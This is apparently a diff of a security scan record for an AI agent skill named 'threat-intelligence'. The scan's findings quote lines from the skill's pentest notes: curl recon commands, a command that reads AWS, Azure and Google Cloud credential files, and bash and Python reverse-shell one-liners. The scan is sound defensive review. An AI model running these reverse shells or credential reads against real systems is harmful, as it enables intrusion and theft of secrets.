@@ -4,30 +4,95 @@
   "repo": "skillquarium",
   "path": "skills/reverse-skill-router/threat-intelligence",
   "name": "threat-intelligence",
-  "description": "",
+  "description": "Use for authorized OSINT and cyber threat intelligence that enriches IOCs, campaigns, impersonation, scams, or threat actors from public sources. Includes bounded X/Twitter search through Xquik, source preservation, corroboration, and evidence handoff.",
   "stars": 12,
   "category": "security",
-  "commit": "f748ea91aa51ce8fc42c27c809dba73a8377b1d5",
-  "contentHash": "9791f7e3b541ef50c51c9cc34380737f71c3e9675597687df9244f95ecf22b31",
+  "commit": "ced6c96bd67acccbf0280a5071e59a523c118c66",
+  "contentHash": "19c4e59fd280421a98d3452bdbc066b7a23a7fb905612ec8ddf5c98ec7667ab8",
   "repoCreatedAt": "2026-06-09T12:36:45Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-13T10:10:34.466Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/reverse-skill-router/threat-intelligence/SKILL.md",
+        "line": 70,
+        "excerpt": "bash skills/scripts/bootstrap-reverse.sh xquik-mcp --mcp-host=codex",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 26,
+        "excerpt": "□ crt.sh: curl -s \"https://crt.sh/?q=%25.{target_domain}&output=json\" | jq -r '.[].name_value' | sort -u",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "crt.sh"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 53,
+        "excerpt": "□ curl -sI https://{target_domain} | grep -i \"server\\|x-powered-by\\|x-aspnet\\|set-cookie\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "{target_domain}"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 441,
+        "excerpt": "□ cat ~/.aws/credentials ~/.azure/accessTokens.json ~/.config/gcloud/credentials.json",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 459,
+        "excerpt": "□ bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 467,
+        "excerpt": "□ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subproc",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 3,
+      "network": 2,
+      "reads-secrets": 1
+    },
+    "score": 70,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 0,
-    "filesSkipped": 2
+    "filesScanned": 4,
+    "filesSkipped": 0
   },
   "history": [
     {
       "commit": "f748ea91aa51ce8fc42c27c809dba73a8377b1d5",
       "scannedAt": "2026-11-08T09:45:03.483Z",
       "score": 100,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "ced6c96bd67acccbf0280a5071e59a523c118c66",
+      "scannedAt": "2026-11-13T10:10:34.466Z",
+      "score": 70,
       "rulesVersion": "1.3.0"
     }
   ]
